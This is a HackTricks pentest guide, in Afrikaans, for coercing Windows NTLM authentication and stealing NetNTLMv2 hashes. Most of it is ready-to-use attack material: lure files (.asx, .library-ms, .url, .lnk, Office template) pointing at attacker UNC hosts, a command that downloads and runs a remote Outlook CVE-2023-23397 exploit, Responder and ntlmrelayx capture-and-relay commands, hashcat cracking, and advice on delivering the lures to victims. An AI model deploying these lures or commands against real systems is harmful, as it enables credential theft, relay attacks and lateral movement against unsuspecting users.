# Plekke om NTLM creds te steel

{{#include ../../banners/hacktricks-training.md}}

**Kyk na al die uitstekende idees by [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) vanaf die aflaai van ’n Microsoft Word-lêer aanlyn tot by die ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md en [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

As jy **na ’n share kan skryf wat users of scheduled jobs in Explorer browse**, plaas lêers waarvan die metadata na jou UNC wys (bv. `\\ATTACKER\share`). Die rendering van die folder trigger **implicit SMB authentication** en leak ’n **NetNTLMv2** na jou listener.<sup>[[1]](#references)</sup>

1. **Generate lures** (dek SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Plaas hulle op die skryfbare share** (enige vouer wat die slagoffer oopmaak):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Luister en crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows kan verskeie lêers gelyktydig tref; enigiets wat Explorer voorbeskou (`BROWSE TO FOLDER`) vereis geen klikke nie.

### Windows Media Player playlists (.ASX/.WAX)

As jy ’n teiken sover kan kry om ’n Windows Media Player-playlist wat jy beheer, oop te maak of voor te beskou, kan jy Net-NTLMv2 leach deur die inskrywing na ’n UNC-pad te wys. WMP sal probeer om die verwysde media oor SMB te haal en sal implisiet authenticate.<sup>[[3]](#references)[[4]](#references)</sup>

Voorbeeld-payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Versamelings- en kraakvloei:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-ingebedde .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer hanteer .library-ms-lêers onveilig wanneer hulle direk vanuit ’n ZIP-argief oopgemaak word. Indien die biblioteekdefinisie na ’n afgeleë UNC-pad wys (bv. \\attacker\share), veroorsaak die eenvoudige blaai na of begin van die .library-ms binne die ZIP dat Explorer die UNC opsom en NTLM-verifikasie na die aanvaller uitstuur. Dit lewer ’n NetNTLMv2 op wat vanlyn gekraak of moontlik gerelay kan word.<sup>[[2]](#references)</sup>

Minimale .library-ms wat na ’n aanvaller se UNC wys
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operasionele stappe
- Skep die .library-ms-lêer met die XML hierbo (stel jou IP/hostname in).
- Zip dit (op Windows: Send to → Compressed (zipped) folder) en lewer die ZIP aan die teiken.
- Begin ’n NTLM capture listener en wag dat die slagoffer die .library-ms vanuit die ZIP oopmaak.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows het die uitgebreide MAPI-eienskap PidLidReminderFileParameter in calendar items verwerk. As daardie eienskap na ’n UNC path gewys het (bv. \\attacker\share\alert.wav), sou Outlook die SMB share kontak wanneer die reminder aktiveer, en die gebruiker se Net‑NTLMv2 sonder enige klik lek. Dit is op 14 Maart 2023 gepatch, maar dit is steeds hoogs relevant vir legacy/onaangeraakte fleets en vir historiese incident response.<sup>[[5]](#references)</sup>

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener-kant:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notas
- ’n Slagoffer hoef slegs Outlook for Windows te hê wat loop wanneer die herinnering geaktiveer word.
- Die leak lewer Net‑NTLMv2 wat geskik is vir offline cracking of relay (nie pass-the-hash nie).


### .LNK/.URL ikoon-gebaseerde zero-click NTLM leak (CVE‑2025‑50154 – omseiling van CVE‑2025‑24054)

Windows Explorer lewer kortpadikone outomaties. Onlangse navorsing het getoon dat dit selfs ná Microsoft se April 2025-patch vir UNC-ikoon-kortpaaie steeds moontlik was om NTLM-verifikasie sonder enige klikke te aktiveer deur die kortpadteiken op ’n UNC path te huisves en die ikoon plaaslik te hou (die patch-omseiling het die CVE‑2025‑50154-toewysing gekry). Deur die vouer bloot te bekyk, veroorsaak dit dat Explorer metadata van die afgeleë teiken ophaal en NTLM na die aanvaller se SMB server uitstuur.<sup>[[6]](#references)</sup>

Minimale Internet Shortcut-payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Afleweringsidees
- Plaas die shortcut in ’n ZIP en kry die slagoffer om dit te browse.
- Plaas die shortcut op ’n writable share wat die slagoffer sal oopmaak.
- Kombineer dit met ander lure files in dieselfde folder sodat Explorer die items preview.

### Geen-klik .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows laai `.lnk`-metadata tydens **view/preview** (ikoon-rendering), nie slegs tydens execution nie. CVE‑2026‑25185 toon ’n parsing-pad waar **ExtraData**-blokke veroorsaak dat die shell ’n ikoonpad resolve en die filesystem **tydens load** aanraak, wat outbound NTLM uitstuur wanneer die pad remote is.

Belangrikste trigger conditions (waargeneem in `CShellLink::_LoadFromStream`):
- Include **DARWIN_PROPS** (`0xa0000006`) in ExtraData (gate na icon update routine).
- Include **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) met **TargetUnicode** populated.
- Die loader expand environment variables in `TargetUnicode` en roep `PathFileExistsW` op die gevolglike pad.

As `TargetUnicode` na ’n UNC-pad resolve (byvoorbeeld `\\attacker\share\icon.ico`), veroorsaak die blote viewing van ’n folder wat die shortcut bevat outbound authentication. Dieselfde load path kan ook deur **indexing** en **AV scanning** getrigger word, wat dit ’n praktiese no-click leak surface maak.<sup>[[7]](#references)</sup>

Research tooling (parser/generator/UI) is beskikbaar in die **LnkMeMaybe**-projek om hierdie structures te build/inspect sonder om die Windows GUI te gebruik.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

Die native **WebDAV client** kan misbruik word om die huidige logon session te dwing om by ’n arbitrêre **HTTP/WebDAV**-endpoint te authenticateer:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Waarom dit nuttig is:
- Teenoor 'n **aanvaller-beheerde WebDAV-bediener** kan dit **NTLM oor HTTP** aktiveer sonder om 'n pasgemaakte client neer te sit.
- Teenoor **interne gashere** is dit 'n diskrete manier om te **valideer waar gesteelde credentials aanvaar word** voordat jy lateraal beweeg.<sup>[[9]](#references)</sup>
- Die opdrag is 'n goeie alternatief wanneer **SMB-egress gefiltreer word**, maar **HTTP/WebDAV** steeds bereikbaar is.

Operasionele notas:
- Die **WebClient**-diens moet op die bron-gasheer loop.
- `rundll32.exe` laai `davclnt.dll` en laat Windows die WebDAV-verifikasie met die **huidige gebruiker se credentials** hanteer.<sup>[[10]](#references)</sup>
- As jy dit na infrastruktuur wys wat jy beheer, gebruik 'n NTLM-bewuste HTTP listener/relay soos:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Vanuit ’n detection-perspektief is herhaalde `rundll32.exe davclnt.dll,DavSetCookie`-uitvoerings teenoor baie interne stelsels ’n sterk aanduiding van **credential validation / spray-like lateral movement prep** eerder as normale gebruikersgedrag.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office-dokumente kan na ’n eksterne template verwys. As jy die aangehegte template op ’n UNC-pad stel, sal die oopmaak van die dokument authenticate teenoor SMB.

Minimale DOCX relationship changes (inside word/):

1) Wysig word/settings.xml en voeg die aangehegte template reference by:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Wysig word/_rels/settings.xml.rels en wys rId1337 na jou UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Repack na .docx en lewer dit af. Begin jou SMB capture listener en wag totdat dit oopgemaak word.

Vir idees ná die capture oor relaying of misbruik van NTLM, kyk na:

{{#ref}}
README.md
{{#endref}}


## Verwysings
- [1] [HTB: Breach – Writable share-lokmiddels + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 na DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction na webroot RCE → FullPowers + GodPotato na SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM-kwesbaarhede: Unpatched privilege escalation-bedreigings in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft versag Outlook EoP (CVE‑2023‑23397) en verduidelik die NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, een NTLM: Microsoft security patch-bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: ’n Review van CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Wanneer IT Support bel: ’n Ontleding van ’n ModeloRAT-veldtog van Teams tot Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
